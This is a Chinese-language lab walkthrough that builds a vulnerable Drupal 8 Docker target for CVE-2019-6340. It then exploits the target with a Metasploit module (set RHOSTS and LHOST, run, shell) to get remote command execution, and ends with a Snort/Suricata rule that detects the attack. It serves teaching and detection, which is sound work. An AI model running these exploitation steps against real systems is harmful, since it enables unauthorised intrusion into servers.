# 0x0 前言
* ()內為測試時使用之環境
* `灰底字`為指令


# 0x1 前置需求
* 攻擊機 (Kali Linux 2020.4)
* 受攻擊機 (Ubuntu 20.04)

# 0x2 受攻擊機環境建置
1. `sudo apt install net-tools` for ifconfig
2. `sudo snap install docker` 安裝docker(19.03.11)  
![1_docker_install.png](image/1_docker_install.png)

3. `sudo docker search CVE-2019-6340` 在docker hub搜尋CVE-2019-6340  
![2_docker_search.png](image/2_docker_search.png)

4. `sudo docker pull knqyf263/cve-2019-6340` pull image from repository  
![3_docker_pull.png](image/3_docker_pull.png)

5. `sudo docker run -d -p 80:80 --name Drupal8  knqyf263/cve-2019-6340` 運行image，-d：背景執行並回傳container ID，-p x:y：本機port x forwarding至虛擬機port y，--name：container的名字，最後為image名稱  
![4_docker_run.png](image/4_docker_run.png)

6. 在本機或是攻擊機開啟瀏覽器並在網址列輸入受攻擊機IP，若出現下圖表示環境建置成功  
![5_vulner_build_success.png](image/5_vulner_build_success.png)


## 其他指令
`sudo docker ps -a` 查看正在執行的container列表

# 0x3 攻擊機攻擊步驟
1. 開啟metasploit framework
2. `search CVE-2019-6340`  
![6_search_msf.png](image/6_search_msf.png)

3. `use exploit/unix/webapp/drupal_restws_unserialize`  
![7_use_msf_module.png](image/7_use_msf_module.png)

4. `set rhosts 192.168.153.129` 設定受攻擊機IP  
![8_set_msf_RHOSTS.png](image/8_set_msf_RHOSTS.png)

5. `set lhost 192.168.153.128` 設定攻擊機IP  
![9_set_msf_LHOST.png](image/9_set_msf_LHOST.png)

6. `run` 發起攻擊並取得meterpreter  
![10_run_msf.png](image/10_run_msf.png)

7. `shell` 取得shell  
![11_get_shell.png](image/11_get_shell.png)

8. 任何不需管理員權限的指令(id)  
![12_validation.png](image/12_validation.png)

# 0x4 Snort/Suricata Rule
1. alert http any any -> any any (msg: "ATTACK [PTsecurity] Arbitrary PHP RCE in Drupal 8 < 8.5.11,8.6.10 (CVE-2019-6340)"; flow: established, to_server; content: "GET"; http_method; content: "hal_json"; http_uri; content: "link"; http_client_body; content: "options"; distance: 0; content: "O:"; distance: 0; http_client_body; pcre: "/\x22options\x22\s*:\s*\x22O:\d+:/P"; reference: cve, 2019-6340; reference: url, www.ambionics.io/blog/drupal8-rce; reference: url, github.com/ptresearch/AttackDetection; classtype: attempted-admin; sid: 10004555; rev: 3; )

